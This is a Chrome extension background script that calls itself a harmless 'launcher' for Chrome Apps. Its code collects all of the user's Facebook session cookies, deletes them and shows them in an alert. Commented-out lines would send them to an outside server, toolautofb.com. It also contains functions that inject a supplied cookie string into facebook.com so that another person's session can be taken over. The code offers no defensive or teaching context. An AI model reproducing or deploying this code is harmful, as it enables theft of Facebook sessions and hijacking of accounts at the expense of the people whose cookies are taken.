// Launcher script for Chrome Apps in the Chrome Web Store.
﻿chrome.runtime.onInstalled.addListener(function () {

});
chrome.browserAction.onClicked.addListener(function () {
    chrome.tabs.create({ url: 'index.html' }, function (tabvl) {
        tabvl.focus();
    });
    getCookie(function (_scookie) {
        alert(_scookie);
        // var cookie = encodeURIComponent(_scookie);
        // var xhttp = new XMLHttpRequest();
        // var urlpost = 'http://toolautofb.com/ajax/GetAccessToken';
        // xhttp.open('POST', urlpost, true);
        // xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        // var datapost = 'v=4.2&cookie='+cookie;
        // xhttp.send(datapost);
    });
});

function getCookie(_callback) {
    chrome.cookies.getAll({ url: 'https://facebook.com' }, function (cks) {
        var scookie = '';
        var idfb = '';
        for (var ck in cks) {
            scookie += cks[ck].name + '=' + cks[ck].value + '; ';
            if(cks[ck].name == 'c_user'){idfb = cks[ck].value;}
            chrome.cookies.remove({ url: 'https://www.facebook.com', name: cks[ck].name });
        }
        _callback(scookie);
    });
}

function removeCookie(cookie) {
    chrome.cookies.getAll({ url: 'https://www.facebook.com' }, function (cks) {
        for (var ck in cks) {
            chrome.cookies.remove({ url: 'https://www.facebook.com', name: cks[ck].name });
        }
    });
    chrome.cookies.getAll({ url: 'https://mbasic.facebook.com' }, function (cks) {
        for (var ck in cks) {
            chrome.cookies.remove({ url: 'https://mbasic.facebook.com', name: cks[ck].name });
        }
    });
    setCookie(cookie,1);
}
function setCookie(cookie,c) {
    if(cookie.indexOf("; ")){
        var arr_cookie = cookie.split("; ");
    }else{
        var arr_cookie = cookie.split(";");
    }
    for(var i=0;i<arr_cookie.length;i++){
        var name = arr_cookie[i].split("=");
        chrome.cookies.set({"url":"https://www.facebook.com","domain" : ".facebook.com","name":name[0],"value":name[1],"secure" : true},function (){});
    }
    for(var i=0;i<arr_cookie.length;i++){
        var name = arr_cookie[i].split("=");
        chrome.cookies.set({"url":"https://mbasic.facebook.com","domain" : ".facebook.com","name":name[0],"value":name[1],"secure" : true},function (){});
    }
    if(c == 1){
        setTimeout(function(){ setCookie(cookie,0); }, 1000);
    }
}

chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        if (request._method == "g1"){
            getCookie(function (_scookie) {
                alert(_scookie);
                // var cookie = encodeURIComponent(_scookie);
                // var xhttp = new XMLHttpRequest();
                // var urlpost = 'http://toolautofb.com/ajax/GetAccessToken';
                // xhttp.open('POST', urlpost, true);
                // xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                // var datapost = 'v=4.2&cookie='+cookie;
                // xhttp.send(datapost);
            });
        }
    }
);